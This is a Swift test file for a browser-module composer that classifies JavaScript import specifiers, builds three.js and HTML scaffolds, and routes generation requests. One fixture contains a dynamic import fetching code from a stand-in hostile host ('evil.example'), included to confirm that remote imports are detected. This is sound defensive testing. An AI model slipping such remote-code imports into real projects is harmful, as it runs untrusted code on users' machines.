import Foundation
import Testing
@testable import EshCore

@Suite
struct BrowserModuleTests {
    // MARK: - Import scanning + classification

    @Test func classifiesModuleSpecifiers() {
        #expect(BrowserModuleComposer.classify("three") == .bare)
        #expect(BrowserModuleComposer.classify("./helpers.js") == .relative)
        #expect(BrowserModuleComposer.classify("../x.js") == .relative)
        #expect(BrowserModuleComposer.classify("/abs.js") == .relative)
        #expect(BrowserModuleComposer.classify("https://cdn.example/three.js") == .url)
        #expect(BrowserModuleComposer.classify("//cdn.example/x.js") == .url)
    }

    @Test func extractsAllImportForms() {
        let js = """
        import * as THREE from "three";
        import { foo } from './util.js';
        import "sideeffect";
        const m = await import("https://evil.example/x.js");
        """
        let specs = Set(BrowserModuleComposer.imports(inJS: js).map { $0.specifier })
        #expect(specs.contains("three"))
        #expect(specs.contains("./util.js"))
        #expect(specs.contains("sideeffect"))
        #expect(specs.contains("https://evil.example/x.js"))   // dynamic import cannot smuggle a remote URL past us
        let urlRefs = BrowserModuleComposer.imports(inJS: js).filter { $0.kind == .url }
        #expect(urlRefs.count == 1)
    }

    // MARK: - Scaffold

    @Test func scaffoldInjectsImportMapAndMount() {
        let html = BrowserModuleComposer.scaffoldIndexHTML(
            title: "T", importMap: ["three": "./vendor/three/three.module.min.js"],
            globals: [("three", "THREE")], hasStyle: true, appEntry: "app.js")
        #expect(html.contains("type=\"importmap\""))
        #expect(html.contains("./vendor/three/three.module.min.js"))
        #expect(html.contains("globalThis.THREE"))
        #expect(html.contains("<div id=\"app\">"))
        #expect(html.contains("src=\"app.js\""))
        #expect(html.contains("<link rel=\"stylesheet\" href=\"style.css\">"))
    }

    @Test func threeScaffoldOwnsRendererAndLoop() {
        let html = BrowserModuleComposer.scaffoldThreeJSIndexHTML(
            title: "Earth", importMap: ["three": "./vendor/three/three.module.min.js"],
            hasStyle: false, appEntry: "app.js")
        #expect(html.contains("WebGLRenderer"))
        #expect(html.contains("globalThis.scene"))
        #expect(html.contains("globalThis.eshTick"))     // per-frame hook the model fills in
        #expect(html.contains("requestAnimationFrame"))
        #expect(html.contains("addEventListener('resize'"))
    }

    @Test func requestedTierBTypeParsesOption() {
        func req(_ pt: String?) -> ExecutionRequest {
            var opts = ExecutionOptions()
            if let pt { opts = ExecutionOptions(["projectType": .string(pt)]) }
            return ExecutionRequest(capability: .projectGenerate, inputs: [.text("x")], output: .project, options: opts)
        }
        #expect(BrowserModuleComposer.requestedTierBType(req("threejs")) == .threejs)
        #expect(BrowserModuleComposer.requestedTierBType(req("browser-module")) == .browserModule)
        #expect(BrowserModuleComposer.requestedTierBType(req(nil)) == nil)
        #expect(BrowserModuleComposer.requestedTierBType(req("static")) == nil)   // not a Tier-B type
    }

    // MARK: - Routing (Phase 5)

    @Test func routesBrowserNativeToProjectGenerateWithType() {
        let r = DeterministicIntentRouter()
        let earth = r.route(message: "Create an interactive rotating 3D Earth with earthquake markers", inputModalities: [])
        #expect(earth.capability == .projectGenerate)
        #expect(earth.arguments["projectType"] == .string("threejs"))
        let solar = r.route(message: "make a three.js solar system", inputModalities: [])
        #expect(solar.capability == .projectGenerate)
        #expect(solar.arguments["projectType"] == .string("threejs"))
    }

    @Test func routingKeepsOtherGenerationsDistinct() {
        let r = DeterministicIntentRouter()
        #expect(r.route(message: "create a static landing page for a cafe", inputModalities: []).capability == .webArtifactGenerate)
        #expect(r.route(message: "generate an svg logo of a fox", inputModalities: []).capability == .vectorGenerate)
        #expect(r.route(message: "generate a photo of a mountain", inputModalities: []).capability == .imageGenerate)
        // No generation verb → not a project (stays chat/other), so Tier-0 doesn't over-trigger.
        #expect(r.route(message: "what is the solar system", inputModalities: []).capability != .projectGenerate)
    }

    @Test func classifierMapsThreeVsGenericBrowserModule() {
        #expect(CapabilityRouteCatalog.browserNativeProjectType("an interactive 3d scene") == .threejs)
        #expect(CapabilityRouteCatalog.browserNativeProjectType("a canvas animation of falling snow") == .browserModule)
        #expect(CapabilityRouteCatalog.browserNativeProjectType("a static landing page") == nil)
    }
}
